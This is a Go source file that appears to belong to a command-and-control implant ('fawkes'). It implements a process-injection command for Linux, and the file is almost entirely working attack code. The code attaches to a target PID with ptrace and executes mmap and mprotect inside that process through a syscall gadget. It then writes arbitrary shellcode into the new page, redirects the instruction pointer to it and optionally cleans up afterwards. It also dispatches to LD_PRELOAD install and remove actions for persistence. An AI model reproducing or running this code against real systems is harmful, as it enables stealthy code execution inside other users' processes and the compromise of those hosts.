//go:build linux && amd64

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("parameters required. Actions: check, inject")
	}

	args, parseErr := unmarshalParams[ptraceInjectArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	action := strings.ToLower(args.Action)
	if action == "" {
		action = "inject"
	}

	switch action {
	case "check":
		return ptraceCheck()
	case "inject":
		return ptraceInject(args)
	case "ld-preload":
		return ldPreloadList()
	case "ld-install":
		ldArgs, ldParseErr := unmarshalParams[ldPreloadArgs](task)
		if ldParseErr != nil {
			return *ldParseErr
		}
		return ldPreloadInstall(ldArgs)
	case "ld-remove":
		ldArgs, ldParseErr := unmarshalParams[ldPreloadArgs](task)
		if ldParseErr != nil {
			return *ldParseErr
		}
		return ldPreloadRemove(ldArgs)
	default:
		return errorf("Unknown action: %s\nAvailable: check, inject, ld-preload, ld-install, ld-remove", args.Action)
	}
}

func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
	shellcode, restore, timeout, err := ptraceValidateAndDecode(args)
	if err != nil {
		return errorf("%v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", args.PID))
	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))

	if err := ptraceCheckProcess(args.PID); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}

	ptraceSendSIGCONTIfStopped(args.PID, &sb)

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	sb.WriteString(fmt.Sprintf("[*] Attaching to PID %d...\n", args.PID))
	if err := syscall.PtraceAttach(args.PID); err != nil {
		hint := ""
		if err == syscall.EPERM {
			hint = "\n[*] Hint: check /proc/sys/kernel/yama/ptrace_scope (0=permissive, 1=parent-only). " +
				"Requires scope=0, CAP_SYS_PTRACE, or running as root."
		}
		return errorResult(sb.String() + fmt.Sprintf("[!] Attach failed: %v%s\n", err, hint))
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
	}
	sb.WriteString("[+] Process stopped\n")

	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Register read failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))

	syscallAddr, err := findSyscallGadget(args.PID)
	if err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Found syscall gadget at 0x%X\n", syscallAddr))

	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if restore {
		scSize++
	}
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	rwAddr, err := ptraceExecSyscall64(args.PID, &origRegs, syscallAddr, 9, 0, pageSize, 3, 0x22, 0xffffffffffffffff, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation failed: %v\n", err))
	}
	if rwAddr >= 0xfffffffffffff000 {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation returned error (0x%X)\n", rwAddr))
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated writable memory at 0x%X (%d bytes)\n", rwAddr, pageSize))

	injectionCode := make([]byte, len(shellcode))
	copy(injectionCode, shellcode)
	if restore {
		injectionCode = append(injectionCode, 0xCC)
	}

	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwAddr), injectionCode); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwAddr))

	mprotectRet, err := ptraceExecSyscall64(args.PID, &origRegs, syscallAddr, 10, rwAddr, pageSize, 5, 0, 0, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Protection change failed: %v\n", err))
	}
	ptraceMprotectCheck(mprotectRet, &sb)

	newRegs := origRegs
	newRegs.Rip = rwAddr
	newRegs.Orig_rax = ^uint64(0)
	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Register write failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwAddr))

	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(args.PID, 0); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Continue failed: %v\n", err))
	}

	if restore {
		stopped, ws := ptraceWaitForShellcode(args.PID, timeout, &sb)
		if !ptraceReportCompletion(stopped, ws, timeout, &sb) {
			_ = syscall.PtraceDetach(args.PID)
			return successResult(sb.String())
		}

		munmapRegs := origRegs
		munmapRegs.Rip = syscallAddr
		munmapRegs.Rax = 11
		munmapRegs.Rdi = rwAddr
		munmapRegs.Rsi = pageSize
		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
			if err := syscall.PtraceSingleStep(args.PID); err == nil {
				_, _ = syscall.Wait4(args.PID, &ws, 0, nil)
				sb.WriteString("[+] Cleaned up RWX page (munmap)\n")
			}
		}

		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
		} else {
			sb.WriteString("[+] Restored original registers\n")
		}
	}

	ptraceDetachAndFinalize(args.PID, &sb)
	return successResult(sb.String())
}

func ptraceExecSyscall64(pid int, origRegs *syscall.PtraceRegs, syscallAddr, sysno, arg1, arg2, arg3, arg4, arg5, arg6 uint64) (uint64, error) {
	regs := *origRegs
	regs.Rip = syscallAddr
	regs.Rax = sysno
	regs.Rdi = arg1
	regs.Rsi = arg2
	regs.Rdx = arg3
	regs.R10 = arg4
	regs.R8 = arg5
	regs.R9 = arg6
	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		return 0, fmt.Errorf("set regs: %w", err)
	}
	if err := syscall.PtraceSingleStep(pid); err != nil {
		return 0, fmt.Errorf("single step: %w", err)
	}
	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return 0, fmt.Errorf("wait4: %w", err)
	}
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		return 0, fmt.Errorf("get regs: %w", err)
	}
	return regs.Rax, nil
}

